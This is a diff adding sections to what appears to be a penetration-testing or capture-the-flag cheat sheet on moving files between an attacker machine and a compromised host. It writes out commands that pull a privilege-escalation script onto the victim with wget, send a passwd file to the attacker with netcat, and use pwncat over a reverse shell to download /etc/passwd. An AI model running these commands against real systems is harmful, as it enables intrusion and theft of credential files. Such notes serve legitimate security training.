@@ -459,6 +459,10 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <h1>Transfer files</h1>
 
+
+
+<h2>With Python</h2>
+
 Run this in the folder you have the files you want to upload.
 
 <b>pform@attacker~: </b><code>python -m SimpleHTTPServer 5555</code>
@@ -468,3 +472,32 @@ Run this in the folder you have the files you want to upload.
 The use wget to download the file like this:
 
 <b>hacked-account@victim~: </b><code>wget 10.10.10.10:5555/super-privesc-0day.sh .</code>
+
+<h2>With NETAT</h2>
+
+On receiving end:
+
+<b>pform@attacker~: </b><code>nc -l 5555 > passwd</code>
+
+On sending end:
+
+<b>hacked-account@victim~: </b><code>cat passwd | nc 10.10.10.10 5555</code>
+
+If you want to transfer from attacker to victim, just swich the commands.
+
+<h2>With PWNCAT</h2>
+
+I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:
+
+<b>hacked-account@victim ~/</b><code></code>
+
+Press<b>"CTRL+D"</b>
+
+<b>pform@local~: </b><code>download /etc/passwd</code>
+
+<b>pform@local~: </b><code>upload ~/super-ninja-scripts/hightech-privesc-0day.py</code>
+
+Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.
+
+<b>hacked-account@victim ~/</b><code></code>
+
